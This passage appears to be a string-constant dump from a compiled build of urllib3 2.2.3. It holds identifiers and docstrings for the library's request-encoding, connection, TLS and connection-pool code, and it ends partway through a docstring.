urllib3._collections>Ta__class__TaselfakeyTaselfaitemapassed_keyapassed_valTaselfakeyavalueTaselfaotheramaybe_constructableaother_as_http_header_dictTaselfakeyavalTaselfakeyaitemTaselfaheadersakwargsa__class__TaselfaheadersTaselfamaxsizeadispose_funca__class__Taselfaotheramaybe_constructableTaselfavalsTaselfTaselfaotherTaselfaotheramaybe_constructablearesultTaselfakeyavalueaevicted_itemw_aevicted_valueTaselfaotherakeyavalTaselfaheader_nameapotential_valueTaselfacontent_specific_headersaheaderTaselfakeyavalacombineakey_loweranew_valsavalsTaselfavaluesavalueTaselfacloneTapotentialTaselfaargsakwargsaotherakeyavalavalueTaselfakeyadefaultTaselfakeyadefaultavalsTaselfakeyavalsavalTaselfakeyadefaulta__class__.urllib3._request_methods!]aheadersuClasses extending RequestMethods must implement their own ``urlopen`` method.aupperurequest got values for both 'body' and 'json' parameters which are mutually exclusiveucontent-typealowerakeysaHTTPHeaderDictuapplication/jsonuContent-Typea_jsonadumpsDaseparatorsaensure_asciiTw,w:FaencodeTuutf-8abodya_encode_url_methodsarequest_encode_urlafieldsarequest_encode_bodyu
        Make a request using :meth:`urlopen` with the appropriate encoding of
        ``fields`` based on the ``method`` used.

        This is a convenience method that requires the least amount of manual
        effort. It can be used in most situations, while still having the
        option to drop down to more specific methods when necessary, such as
        :meth:`request_encode_url`, :meth:`request_encode_body`,
        or even the lowest level :meth:`urlopen`.

        :param method:
            HTTP request method (such as GET, POST, PUT, etc.)

        :param url:
            The URL to perform the request on.

        :param body:
            Data to send in the request body, either :class:`str`, :class:`bytes`,
            an iterable of :class:`str`/:class:`bytes`, or a file-like object.

        :param fields:
            Data to encode and send in the URL or request body, depending on ``method``.

        :param headers:
            Dictionary of custom headers to send, such as User-Agent,
            If-None-Match, etc. If None, pool headers are used. If provided,
            these headers completely replace any pool-specific headers.

        :param json:
            Data to encode and send as JSON with UTF-encoded in the request body.
            The ``"Content-Type"`` header will be set to ``"application/json"``
            unless specified otherwise.
        w?aurlencodeaurlopenu
        Make a request using :meth:`urlopen` with the ``fields`` encoded in
        the url. This is useful for request methods like GET, HEAD, DELETE, etc.

        :param method:
            HTTP request method (such as GET, POST, PUT, etc.)

        :param url:
            The URL to perform the request on.

        :param fields:
            Data to encode and send in the URL.

        :param headers:
            Dictionary of custom headers to send, such as User-Agent,
            If-None-Match, etc. If None, pool headers are used. If provided,
            these headers completely replace any pool-specific headers.
        urequest got values for both 'fields' and 'body', can only specify one.aencode_multipart_formdataTaboundaryutoo many values to unpack (expected 2)uapplication/x-www-form-urlencodedasetdefaultu
        Make a request using :meth:`urlopen` with the ``fields`` encoded in
        the body. This is useful for request methods like POST, PUT, PATCH, etc.

        When ``encode_multipart=True`` (default), then
        :func:`urllib3.encode_multipart_formdata` is used to encode
        the payload with the appropriate content type. Otherwise
        :func:`urllib.parse.urlencode` is used with the
        'application/x-www-form-urlencoded' content type.

        Multipart encoding must be used when posting files, and it's reasonably
        safe to use it in other times too. However, it may break request
        signing, such as with OAuth.

        Supports an optional ``fields`` parameter of key/value strings AND
        key/filetuple. A filetuple is a (filename, data, MIME type) tuple where
        the MIME type is optional. For example::

            fields = {
                'foo': 'bar',
                'fakefile': ('foofile.txt', 'contents of foofile'),
                'realfile': ('barfile.txt', open('realfile').read()),
                'typedfile': ('bazfile.bin', open('bazfile').read(),
                              'image/jpeg'),
                'nonamefile': 'contents of nonamefile field',
            }

        When uploading a file, providing a filename (the first parameter of the
        tuple) is optional but recommended to best mimic behavior of browsers.

        Note that if ``headers`` are supplied, the 'Content-Type' header will
        be overwritten because it depends on the dynamic random boundary string
        which is used to compose the body of the request. The random boundary
        string can be explicitly set with the ``multipart_boundary`` parameter.

        :param method:
            HTTP request method (such as GET, POST, PUT, etc.)

        :param url:
            The URL to perform the request on.

        :param fields:
            Data to encode and send in the request body.

        :param headers:
            Dictionary of custom headers to send, such as User-Agent,
            If-None-Match, etc. If None, pool headers are used. If provided,
            these headers completely replace any pool-specific headers.

        :param encode_multipart:
            If True, encode the ``fields`` using the multipart/form-data MIME
            format.

        :param multipart_boundary:
            If not specified, then a random boundary will be generated using
            :func:`urllib3.filepost.choose_boundary`.
        a__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsajsonlatypinguurllib.parseTaurlencodea_base_connectionTa_TYPE_BODYla_TYPE_BODYa_collectionsTaHTTPHeaderDictafilepostTa_TYPE_FIELDSaencode_multipart_formdataa_TYPE_FIELDSaresponseTaBaseHTTPResponseaBaseHTTPResponseaRequestMethodsa__all__aUnionaSequenceaTupleTOstrObytesaMappinga_TYPE_ENCODE_URL_FIELDSuurllib3._request_methodsa__module__u
    Convenience mixin for classes who implement a :meth:`urlopen` method, such
    as :class:`urllib3.HTTPConnectionPool` and
    :class:`urllib3.PoolManager`.

    Provides behavior for making common types of HTTP request methods and
    decides which type of request field encoding to use.

    Specifically,

    :meth:`.request_encode_url` is for sending requests whose fields are
    encoded in the URL (such as GET, HEAD, DELETE).

    :meth:`.request_encode_body` is for sending requests whose fields are
    encoded in the *body* of the request using multipart or www-form-urlencoded
    (such as for POST, PUT, PATCH).

    :meth:`.request` is for making any kind of request, it will look up the
    appropriate encoding format and use one of the above two methods to make
    the request.

    Initializer parameters:

    :param headers:
        Headers to include with all requests, unless other headers are given
        explicitly.
    a__qualname__SaDELETEaHEADaGETaOPTIONSTnDaheadersareturnutyping.Mapping[str, str] | NoneaNonea__init__uRequestMethods.__init__TnntnDamethodaurlabodyaheadersaencode_multipartamultipart_boundaryakwareturnastrpu_TYPE_BODY | Noneutyping.Mapping[str, str] | Noneaboolustr | Noneutyping.AnyaBaseHTTPResponseuRequestMethods.urlopenTnnnnDamethodaurlabodyafieldsaheadersajsonaurlopen_kwareturnastrpu_TYPE_BODY | Noneu_TYPE_FIELDS | Noneutyping.Mapping[str, str] | Noneutyping.Any | Noneutyping.AnyaBaseHTTPResponsearequestuRequestMethods.requestTnnDamethodaurlafieldsaheadersaurlopen_kwareturnastrpu_TYPE_ENCODE_URL_FIELDS | Noneutyping.Mapping[str, str] | NoneastraBaseHTTPResponseuRequestMethods.request_encode_urlDamethodaurlafieldsaheadersaencode_multipartamultipart_boundaryaurlopen_kwareturnastrpu_TYPE_FIELDS | Noneutyping.Mapping[str, str] | Noneaboolustr | NoneastraBaseHTTPResponseuRequestMethods.request_encode_bodyuurllib3\_request_methods.pyu<module urllib3._request_methods>TaselfaheadersTaselfamethodaurlabodyafieldsaheadersajsonaurlopen_kwTaselfamethodaurlafieldsaheadersaencode_multipartamultipart_boundaryaurlopen_kwaextra_kwabodyacontent_typeTaselfamethodaurlafieldsaheadersaurlopen_kwaextra_kwTaselfamethodaurlabodyaheadersaencode_multipartamultipart_boundaryakwu.urllib3._versiona__doc__a__file__a__spec__aoriginahas_locationa__cached__a__annotations__aTYPE_CHECKINGaVERSION_TUPLEaversiona__version__a__version_tuple__aversion_tupleu2.2.3Tlpluurllib3\_version.pyu<module urllib3._version>u.urllib3.connection@a__class__a__init__aTimeoutaresolve_default_timeoutTahostaportatimeoutasource_addressablocksizeasocket_optionsaproxyaproxy_configa_has_connected_to_proxya_response_optionsa_tunnel_hosta_tunnel_porta_tunnel_schemea_dns_hostarstripTw.u
        Getter method to remove any trailing dots that indicate the hostname is an FQDN.

        In general, SSL certificates don't include the trailing dot indicating a
        fully-qualified domain name, and thus, they don't validate properly when
        checked against a domain name that includes the dot. In addition, some
        servers may not expect to receive the trailing dot when provided.

        However, the hostname with trailing dot is critical to DNS resolution; doing a
        lookup with the trailing dot will properly only resolve the appropriate FQDN,
        whereas a lookup without a trailing dot will search the system's search domain
        list. Thus, it's important to keep the original host around for use only in
        those cases where it's appropriate (i.e., when doing DNS lookup to establish the
        actual TCP connection across which we're going to send HTTP requests).
        u
        Setter for the `host` property.

        We assume that only urllib3 uses the _dns_host attribute; httplib itself
        only uses `host`, and it seems reasonable that other libraries follow suit.
        aconnectionacreate_connectionaportatimeoutasource_addressTasource_addressasocket_optionsasocketagaierroraNameResolutionErrorahostaSocketTimeoutaConnectTimeoutErroruConnection to uu timed out. (connect timeout=w)aNewConnectionErroruFailed to establish a new connection: a_HAS_SYS_AUDITaaudituhttp.client.connectuEstablish a socket connection and set nodelay settings on it.

        :return: New socket connection.
        TahttpahttpsuInvalid proxy scheme for tunneling: u, must be either 'http' or 'https'aset_tunnelTaportaheadersahttpaclienta_MAXLINEcCONNECT %s:%d HTTP/1.0
aencodeTaasciia_tunnel_headersaitemsutoo many values to unpack (expected 2)aheadersu: u
ulatin-1c
asendcaresponse_classasocka_methodTamethoda_read_statusutoo many values to unpack (expected 3)aHTTPStatusaOKacloseuTunnel connection failed: w astriparesponseafpareadlinelaLineTooLongTuheader lineTc
d
caselfadebuglevellaprintuheader:adecodea_new_conna_tunnelaproxy_is_verifiedawait_for_readDatimeoutZu
        Return True if a forwarding proxy is configured, else return False
        ais_verifieda_CONTAINS_CONTROL_CHAR_REasearchuMethod cannot contain non-token characters u (found at least agroupaputrequestTaskip_hostaskip_accept_encodingaputheaderato_straloweraSKIPPABLE_HEADERSu', 'asortedatitleuurllib3.util.SKIP_HEADER only supports 'w'aSKIP_HEADERu<genexpr>uHTTPConnection.putheader.<locals>.<genexpr>asettimeouta_ResponseOptionsTarequest_methodarequest_urlapreload_contentadecode_contentaenforce_content_lengthuaccept-encodingTaskip_accept_encodingaskip_hostabody_to_chunksablocksizeTamethodablocksizeachunksacontent_lengthutransfer-encodingTuTransfer-Encodingachunkeducontent-lengthuContent-Lengthuuser-agentuUser-Agenta_get_default_user_agentaendheadersTuutf-8c%x
%b
Tc0

uHTTPConnection.request.<locals>.<genexpr>awarningsawarnaDeprecationWarninglTuHTTPConnection.request_chunked() is deprecated and will be removed in urllib3 v2.1.0. Instead use HTTPConnection.request(..., chunked=True).TacategoryastacklevelarequestTabodyaheadersachunkedu
        Alternative to the common request method, which sends the
        body with chunked encoding and not as one block
        aResponseNotReadyTaHTTPResponseaHTTPResponseagetresponseaassert_header_parsingamsgaHeaderParsingErroralogawarninguFailed to parse headers (url=%s): %sa_url_from_connectionarequest_urlDaexc_infotaHTTPHeaderDictastatusaversiona_http_vsn_struHTTP/?areasonapreload_contentadecode_contentaenforce_content_lengtharequest_methodTabodyaheadersastatusaversionaversion_stringareasonapreload_contentadecode_contentaoriginal_responseaenforce_content_lengtharequest_methodarequest_urlu
        Get the response from the server.

        If the HTTPConnection is in the correct state, returns an instance of HTTPResponse or of whatever object is returned by the response_class variable.

        If a request has not been sent or if a previous response has not be handled, ResponseNotReady is raised. If the HTTP response indicates that the connection should be closed, then it will be closed before the response is returned. When the connection is closed, the underlying socket is closed.
        Taportatimeoutasource_addressablocksizeasocket_optionsaproxyaproxy_configakey_fileacert_fileakey_passwordassl_contextaserver_hostnameaassert_hostnameaassert_fingerprintassl_versionassl_minimum_versionassl_maximum_versionaexpanduseraca_certsaca_cert_diraca_cert_dataaverify_modearesolve_cert_reqsTnacert_reqsa_connect_callbackTuHTTPSConnection.set_cert() is deprecated and will be removed in urllib3 v2.1.0. Instead provide the parameters to the HTTPSConnection constructor.u
        This method should only be called once, before the connection is used.
        ah2assl_aALPN_PROTOCOLSahttp2_probeaacquire_and_getTahostaportathreadingaget_identTubefore connectTathread_idatarget_supports_http2ahttpsa_connect_tls_proxyadatetimeadateatodayaRECENT_DATEuSystem time is way off (before u). This will probably lead to SSL verification errorsaSystemTimeWarninga_ssl_wrap_socket_and_match_hostnameTasockacert_reqsassl_versionassl_minimum_versionassl_maximum_versionaca_certsaca_cert_diraca_cert_dataacert_fileakey_fileakey_passwordaserver_hostnameassl_contextatls_in_tlsaassert_hostnameaassert_fingerprintTuafter connect failureaset_and_releaseTahostaportasupports_http2aselected_alpn_protocolaproxy_is_forwardingacastaProxyConfigTacert_reqsassl_versionassl_minimum_versionassl_maximum_versionaca_certsaca_cert_diraca_cert_dataaserver_hostnameassl_contextaassert_hostnameaassert_fingerprintacert_fileakey_fileakey_passwordatls_in_tlsu
        Establish a TLS connection to the proxy using the provided SSL context.
        acreate_urllib3_contextaresolve_ssl_versionTassl_versionassl_minimum_versionassl_maximum_versionacert_reqsaIS_PYOPENSSLaHAS_NEVER_CHECK_COMMON_NAMEacheck_hostnameaload_default_certsTu[]w%arfindTw%ais_ipaddressassl_wrap_socketT
asockakeyfileacertfileakey_passwordaca_certsaca_cert_diraca_cert_dataaserver_hostnameassl_contextatls_in_tlsa_assert_fingerprintagetpeercertTtTabinary_formasslaCERT_NONEahostname_checks_common_namea_match_hostnamea_WrappedAndVerifiedSocketassl_sockaCERT_REQUIREDTasocketais_verifieduLogic for constructing an SSLContext from all TLS parameters, passing
    that down into ssl_wrap_socket, and then doing certificate verification
    either via hostname or fingerprint. This function exists to guarantee
    that both proxies and targets have the same behavior when connecting via TLS.
    amatch_hostnameaasserted_hostnameaCertificateErroruCertificate did not match expected hostname: %s. Certificate: %sa_peer_certareasplitu[^a-z]uwrong version numberuunknown protocolurecord layer failureaProxyErroruUnable to connect to proxyu. Your proxy appears to only use HTTP and not HTTPS, try changing your proxy URL to be HTTP. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#https-proxy-error-http-proxya__cause__upython-urllib3/a__version__aHTTPSConnectionaUrlTaschemeahostaportapathaurluReturns the URL from a given connection. This is mainly used for testing and logging.a__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsuhttp.clientaloggingaosasysatypingTaHTTPConnectionaHTTPConnectiona_HTTPConnectionTaHTTPExceptionaHTTPExceptionTaResponseNotReadyTatimeouta_collectionsTaHTTPHeaderDictahttp2Taprobeaprobeuutil.responseTaassert_header_parsinguutil.timeoutTa_DEFAULT_TIMEOUTa_TYPE_TIMEOUTaTimeouta_DEFAULT_TIMEOUTa_TYPE_TIMEOUTuutil.utilTato_struutil.waitTawait_for_readaSSLErroraBaseSSLErrorTEImportErrorEAttributeErrorTEBaseExceptiona__prepare__a__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>uurllib3.connectiona__module__a__qualname__a__orig_bases__a_base_connectionTa_TYPE_BODYa_TYPE_BODYTaProxyConfigTa_ResponseOptionsa_versionTa__version__aexceptionsTaConnectTimeoutErroraHeaderParsingErroraNameResolutionErroraNewConnectionErroraProxyErroraSystemTimeWarningautilTaSKIP_HEADERaSKIPPABLE_HEADERSaconnectionassl_uutil.requestTabody_to_chunksuutil.ssl_Taassert_fingerprintTacreate_urllib3_contextais_ipaddressaresolve_cert_reqsaresolve_ssl_versionassl_wrap_socketuutil.ssl_match_hostnameTaCertificateErroramatch_hostnameuutil.urlTaUrlaConnectionErroraBrokenPipeErroragetLoggerTuurllib3.connectionDahttpahttpslPlaport_by_schemeTlllacompileTu[^-!#$%&'*+.^_`|~0-9a-zA-Z]u
    Based on :class:`http.client.HTTPConnection` but provides an extra constructor
    backwards-compatibility layer between older and newer Pythons.

    Additional keyword parameters are used to configure attributes of the connection.
    Accepted parameters include:

    - ``source_address``: Set the source address for the current connection.
    - ``socket_options``: Set specific options on the underlying socket. If not specified, then
      defaults are loaded from ``HTTPConnection.default_socket_options`` which includes disabling
      Nagle's algorithm (sets TCP_NODELAY to 1) unless the connection is behind a proxy.

      For example, if you wish to enable TCP Keep Alive in addition to the defaults,
      you might pass:

      .. code-block:: python

         HTTPConnection.default_socket_options + [
             (socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1),
         ]

      Or you may want to disable the defaults by passing an empty list (e.g., ``[]``).
    a__annotations__adefault_portutyping.ClassVar[int]aIPPROTO_TCPaTCP_NODELAYadefault_socket_optionsutyping.ClassVar[connection._TYPE_SOCKET_OPTIONS]aboolubool | Noneaintutuple[str, int] | Noneuconnection._TYPE_SOCKET_OPTIONS | Noneu_ResponseOptions | Noneustr | Noneuint | NonelDahostaportatimeoutasource_addressablocksizeasocket_optionsaproxyaproxy_configareturnastruint | Nonea_TYPE_TIMEOUTutuple[str, int] | NoneaintuNone | connection._TYPE_SOCKET_OPTIONSuUrl | NoneuProxyConfig | NoneaNoneuHTTPConnection.__init__apropertyDareturnastruHTTPConnection.hostasetterDavalueareturnastraNoneDareturnusocket.socketuHTTPConnection._new_connTnnahttpDahostaportaheadersaschemeareturnastruint | Noneutyping.Mapping[str, str] | NoneastraNoneuHTTPConnection.set_tunnelaversion_infoTlllDareturnaNoneuHTTPConnection._tunnelaconnectuHTTPConnection.connectDareturnaboolais_closeduHTTPConnection.is_closedais_connecteduHTTPConnection.is_connectedahas_connected_to_proxyuHTTPConnection.has_connected_to_proxyuHTTPConnection.proxy_is_forwardinguHTTPConnection.closeTFpDamethodaurlaskip_hostaskip_accept_encodingareturnastrpaboolpaNoneuHTTPConnection.putrequestDaheaderavaluesareturnastrpaNoneuHTTPConnection.putheaderTnnDachunkedapreload_contentadecode_contentaenforce_content_lengthFtppDamethodaurlabodyaheadersachunkedapreload_contentadecode_contentaenforce_content_lengthareturnastrpu_TYPE_BODY | Noneutyping.Mapping[str, str] | NoneaboolpppaNoneuHTTPConnection.requestDamethodaurlabodyaheadersareturnastrpu_TYPE_BODY | Noneutyping.Mapping[str, str] | NoneaNonearequest_chunkeduHTTPConnection.request_chunkedDareturnaHTTPResponseuHTTPConnection.getresponseu
    Many of the parameters to this constructor are passed to the underlying SSL
    socket by means of :py:func:`urllib3.util.ssl_wrap_socket`.
    uint | str | NoneuNone | str | bytesutyping.Callable[..., None] | NoneDahostaportatimeoutasource_addressablocksizeasocket_optionsaproxyaproxy_configacert_reqsaassert_hostnameaassert_fingerprintaserver_hostnameassl_contextaca_certsaca_cert_diraca_cert_dataassl_minimum_versionassl_maximum_versionassl_versionacert_fileakey_fileakey_passwordareturnastruint | Nonea_TYPE_TIMEOUTutuple[str, int] | NoneaintuNone | connection._TYPE_SOCKET_OPTIONSuUrl | NoneuProxyConfig | Noneuint | str | NoneuNone | str | typing.Literal[False]ustr | Noneustr | Noneussl.SSLContext | Noneustr | Noneustr | NoneuNone | str | bytesuint | Noneuint | Noneuint | str | Noneustr | Noneustr | Noneustr | NoneaNoneuHTTPSConnection.__init__TnnnnnnnnnD
akey_fileacert_fileacert_reqsakey_passwordaca_certsaassert_hostnameaassert_fingerprintaca_cert_diraca_cert_dataareturnustr | Noneustr | Noneuint | str | Noneustr | Noneustr | NoneuNone | str | typing.Literal[False]ustr | Noneustr | NoneuNone | str | bytesaNoneaset_certuHTTPSConnection.set_certuHTTPSConnection.connectDahostnameasockareturnastrusocket.socketussl.SSLSocketuHTTPSConnection._connect_tls_proxyaNamedTupleu
    Wrapped socket and whether the connection is
    verified after the TLS handshake
    ussl.SSLSocket | SSLTransportDatls_in_tlsFDasockacert_reqsassl_versionassl_minimum_versionassl_maximum_versionacert_fileakey_fileakey_passwordaca_certsaca_cert_diraca_cert_dataaassert_hostnameaassert_fingerprintaserver_hostnameassl_contextatls_in_tlsareturnusocket.socketuNone | str | intuNone | str | intuint | Noneuint | Noneustr | Noneustr | Noneustr | Noneustr | Noneustr | NoneuNone | str | bytesuNone | str | typing.Literal[False]ustr | Noneustr | Noneussl.SSLContext | Noneaboola_WrappedAndVerifiedSocketTFDacertaasserted_hostnameahostname_checks_common_nameareturnu_TYPE_PEER_CERT_RET_DICT | NoneastraboolaNoneDaerraproxy_schemeareturnaExceptionustr | NoneaProxyErrora_wrap_proxy_erroruUsed to detect a failed ConnectionCls import.aDummyConnectionaVerifiedHTTPSConnectionDaconnapathareturnuHTTPConnection | HTTPSConnectionustr | Noneastruurllib3\connection.pyTa.0wvTa__class__Ta.0wku<module urllib3.connection>T
aselfahostaportatimeoutasource_addressablocksizeasocket_optionsaproxyaproxy_configa__class__Taselfahostaportatimeoutasource_addressablocksizeasocket_optionsaproxyaproxy_configacert_reqsaassert_hostnameaassert_fingerprintaserver_hostnameassl_contextaca_certsaca_cert_diraca_cert_dataassl_minimum_versionassl_maximum_versionassl_versionacert_fileakey_fileakey_passworda__class__Taselfahostnameasockaproxy_configassl_contextasock_and_verifiedTacertaasserted_hostnameahostname_checks_common_nameastripped_hostnameweTaselfasockweTasockacert_reqsassl_versionassl_minimum_versionassl_maximum_versionacert_fileakey_fileakey_passwordaca_certsaca_cert_diraca_cert_dataaassert_hostnameaassert_fingerprintaserver_hostnameassl_contextatls_in_tlsacertadefault_ssl_contextacontextanormalizedassl_sockahostname_checks_common_nameTaselfa_MAXLINEaconnectaheadersaheaderavaluearesponseaversionacodeamessagealineTaconnapathaschemeTaerraproxy_schemeaerror_normalizedais_likely_http_proxyahttp_proxy_warninganew_errTaselfa__class__TaselfTaselfatarget_supports_http2asockaserver_hostnameaprobe_http2_hostaprobe_http2_portatls_in_tlsais_time_offaserver_hostname_rm_dotasock_and_verifiedasupports_http2Taselfaresp_optionsaHTTPResponseahttplib_responseahpeaheadersaresponsea__class__TaselfavalueTaselfaheaderavaluesaskippable_headersa__class__Taselfamethodaurlaskip_hostaskip_accept_encodingamatcha__class__Taselfamethodaurlabodyaheadersachunkedapreload_contentadecode_contentaenforce_content_lengthaheader_keysaskip_accept_encodingaskip_hostachunks_and_clachunksacontent_lengthaheaderavalueachunkTaselfamethodaurlabodyaheadersT
aselfakey_fileacert_fileacert_reqsakey_passwordaca_certsaassert_hostnameaassert_fingerprintaca_cert_diraca_cert_dataTaselfahostaportaheadersaschemea__class__.urllib3.connectionpoolSlaLocationValueErrorTuNo host specified.a_normalize_hostaschemeTaschemeahostaportanormalize_hostalowera_tunnel_hosta__name__uu(host=u, port=w)acloseaConnectionPoola__init__aRequestMethodsaTimeoutafrom_floataRetryaDEFAULTatimeoutaretriesaQueueClsapoolablockaproxyaproxy_headersaproxy_configaselfaputTnlanum_connectionsanum_requestsaconn_kwasetdefaultasocket_optionsaweakrefafinalizea_close_pool_connectionslalogadebuguStarting new HTTP connection (%d): %s:%su80aConnectionClsaconnect_timeoutu
        Return a fresh :class:`HTTPConnection`.
        aClosedPoolErroruPool is closed.agetTablockatimeoutaqueueaEmptyaEmptyPoolErroruPool is empty and a new connection can't be opened due to blocking mode.ais_connection_droppeduResetting dropped connection: %sa_new_connu
        Get a connection. Will return a pooled connection if one is available.

        If no connections are available and :prop:`.block` is ``False``, then a
        fresh connection is returned.

        :param timeout:
            Seconds to wait before giving up and raising
            :class:`urllib3.exceptions.EmptyPoolError` if the pool is empty and
            :prop:`.block` is ``True``.
        DablockFaFullaFullPoolErroruPool reached maximum size and no more connections are allowed.awarninguConnection pool is full, discarding connection: %s. Connection pool size: %saqsizeu
        Put a connection back into the pool.

        :param conn:
            Connection object for the current host and port as returned by
            :meth:`._new_conn` or :meth:`._get_conn`.

        If the pool is already full, the connection is closed and discarded
        because we exceeded maxsize. If connections are discarded frequently,
        then maxsize should be increased.

        If the pool is closed, then the connection will be closed and discarded.
        a_DEFAULT_TIMEOUTacloneuHelper that always returns a :class:`urllib3.util.Timeout`aSocketTimeoutaReadTimeoutErroruRead timed out. (read timeout=aerrnoa_blocking_errnosuIs the error actually a timeout? Will raise a ReadTimeout or passa_get_timeoutastart_connectaresolve_default_timeouta_validate_connaBaseSSLErrora_raise_timeoutTaerraurlatimeout_valueaNewConnectionErroraTimeoutErroraCertificateErroraSSLErrorahas_connected_to_proxya_wrap_proxy_errorarequestTabodyaheadersachunkedapreload_contentadecode_contentaenforce_content_lengthaBrokenPipeErroraEPROTOTYPEaECONNRESETaread_timeoutais_closedagetresponsea_connectiona_poolu%s://%s:%s "%s %s HTTP/%s" %s %saversionastatusalength_remainingu
        Perform a request on a given urllib connection object taken from our
        pool.

        :param conn:
            a connection from one of our connection pools

        :param method:
            HTTP request method (such as GET, POST, PUT, etc.)

        :param url:
            The URL to perform the request on.

        :param body:
            Data to send in the request body, either :class:`str`, :class:`bytes`,
            an iterable of :class:`str`/:class:`bytes`, or a file-like object.

        :param headers:
            Dictionary of custom headers to send, such as User-Agent,
            If-None-Match, etc. If None, pool headers are used. If provided,
            these headers completely replace any pool-specific headers.

        :param retries:
            Configure the number of retries to allow before raising a
            :class:`~urllib3.exceptions.MaxRetryError` exception.

            Pass ``None`` to retry until you receive a response. Pass a
            :class:`~urllib3.util.retry.Retry` object for fine-grained control
            over different types of retries.
            Pass an integer number to retry connection errors that many times,
            but no other types of errors. Pass zero to never retry.

            If ``False``, then retries are disabled and any exception is raised
            immediately. Also, instead of raising a MaxRetryError on redirects,
            the redirect response will be returned.

        :type retries: :class:`~urllib3.util.retry.Retry`, False, or an int.

        :param timeout:
            If specified, overrides the default timeout for this one
            request. It may be a float (in seconds) or an instance of
            :class:`urllib3.util.Timeout`.

        :param chunked:
            If True, urllib3 will send the body using chunked transfer
            encoding. Otherwise, urllib3 will send the body using the standard
            content-length form. Defaults to False.

        :param response_conn:
            Set this to ``None`` if you will handle releasing the connection or
            set the connection to have the response release it.

        :param preload_content:
          If True, the response's body will be preloaded during construction.

        :param decode_content:
            If True, will attempt to decode the body based on the
            'content-encoding' header.

        :param enforce_content_length:
            Enforce content length checking. Body returned by server must match
            value of Content-Length header, if present. Otherwise, raise error.
        utoo many values to unpack (expected 2)u
        Close all pooled connections and disable the pool.
        astartswithTw/aparse_urlunot enough values to unpack (expected at least 4, got %d)ahttpaport_by_schemeu
        Check if the given ``url`` is a member of the same host as this
        connection pool.
        aheadersafrom_intTaredirectadefaultais_same_hostaHostChangedErrorato_stra_encode_targetaurlaconnection_requires_http_tunnelacopyaupdateaset_file_positiona_get_connTatimeouta_prepare_proxya_make_requestabodyachunkedaresponse_connapreload_contentadecode_contentaHTTPExceptionaProtocolErroraProxyErroraconnuConnection aborted.aincrementaexc_infolTaerrora_poola_stacktraceasleepa_put_connuRetrying (%r) after connection broken by '%r': %saurlopenapool_timeoutarelease_connabody_posaresponseaget_redirect_locationlaGETaHTTPHeaderDicta_prepare_for_method_changeamethodTaresponsea_poolaMaxRetryErroraraise_on_redirectadrain_connasleep_for_retryuRedirecting %s -> %saredirectaassert_same_hostTuRetry-Afterais_retryaraise_on_statusuRetry: %su
        Get a connection from the pool and perform an HTTP request. This is the
        lowest level call for making a request, so you'll need to specify all
        the raw details.

        .. note::

           More commonly, it's appropriate to use a convenience method
           such as :meth:`request`.

        .. note::

           `release_conn` will only behave as expected if
           `preload_content=False` because we want to make
           `preload_content=False` the default behaviour someday soon without
           breaking backwards compatibility.

        :param method:
            HTTP request method (such as GET, POST, PUT, etc.)

        :param url:
            The URL to perform the request on.

        :param body:
            Data to send in the request body, either :class:`str`, :class:`bytes`,
            an iterable of :class:`str`/:class:`bytes`, or a file-like object.

        :param headers:
            Dictionary of custom headers to send, such as User-Agent,
            If-None-Match, etc. If None, pool headers are used. If provided,
            these headers completely replace any pool-specific headers.

        :param retries:
            Configure the number of retries to allow before raising a
            :class:`~urllib3.exceptions.MaxRetryError` exception.

            If ``None`` (default) will retry 3 times, see ``Retry.DEFAULT``. Pass a
            :class:`~urllib3.util.retry.Retry` object for fine-grained control
            over different types of retries.
            Pass an integer number to retry connection errors that many times,
            but no other types of errors. Pass zero to never retry.

            If ``False``, then retries are disabled and any exception is raised
            immediately. Also, instead of raising a MaxRetryError on redirects,
            the redirect response will be returned.

        :type retries: :class:`~urllib3.util.retry.Retry`, False, or an int.

        :param redirect:
            If True, automatically handle redirects (status codes 301, 302,
            303, 307, 308). Each redirect counts as a retry. Disabling retries
            will disable redirect, too.

        :param assert_same_host:
            If ``True``, will make sure that the host of the pool requests is
            consistent else will raise HostChangedError. When ``False``, you can
            use the pool on an HTTP proxy and request foreign hosts.

        :param timeout:
            If specified, overrides the default timeout for this one
            request. It may be a float (in seconds) or an instance of
            :class:`urllib3.util.Timeout`.

        :param pool_timeout:
            If set and the pool is set to block=True, then this method will
            block for ``pool_timeout`` seconds and raise EmptyPoolError if no
            connection is available within the time period.

        :param bool preload_content:
            If True, the response's body will be preloaded into memory.

        :param bool decode_content:
            If True, will attempt to decode the body based on the
            'content-encoding' header.

        :param release_conn:
            If False, then the urlopen call will not release the connection
            back into the pool once a response is received (but will release if
            you read the entire contents of the response such as when
            `preload_content=True`). This is useful if you're not preloading
            the response's content immediately. You will need to call
            ``r.release_conn()`` on the response ``r`` to return the connection
            back into the pool. If None, it takes the value of ``preload_content``
            which defaults to ``True``.

        :param bool chunked:
            If True, urllib3 will send the body using chunked transfer
            encoding. Otherwise, urllib3 will send the body using the standard
            content-length form. Defaults to False.

        :param int body_pos:
            Position to seek to in file-like body in the event of a retry or
            redirect. Typically this won't need to be set because urllib3 will
            auto-populate the value when needed.
        a__class__akey_fileacert_fileacert_reqsakey_passwordaca_certsaca_cert_dirassl_versionassl_minimum_versionassl_maximum_versionaassert_hostnameaassert_fingerprintahttpsaset_tunnelTaschemeahostaportaheadersaconnectuEstablishes a tunnel connection through HTTP CONNECT.uStarting new HTTPS connection (%d): %s:%su443aDummyConnectionuCan't connect to HTTPS URL because the SSL module is not available.u
        Return a fresh :class:`urllib3.connection.HTTPConnection`.
        ais_verifiedaproxy_is_verifiedawarningsawarnuUnverified HTTPS request is being made to host 'u'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warningsaInsecureRequestWarningu
        Called right before a request is made, after the socket is created.
        lPaHTTPSConnectionPoolaHTTPConnectionPoolu
    Given a url, return an :class:`.ConnectionPool` instance of its host.

    This is a shortcut for not having to parse out the scheme, host, and port
    of the url before creating an :class:`.ConnectionPool` instance.

    :param url:
        Absolute URL string that must include the scheme. Port is optional.

    :param \**kw:
        Passes additional parameters to the constructor of the appropriate
        :class:`.ConnectionPool`. Useful for specifying things like
        timeout, maxsize, headers, etc.

    Example::

        >>> conn = connection_from_url('http://google.com/')
        >>> r = conn.request('GET', '/')
    Tw[aendswithTw]:lqnu
    Normalize hosts for comparisons and use with sockets.
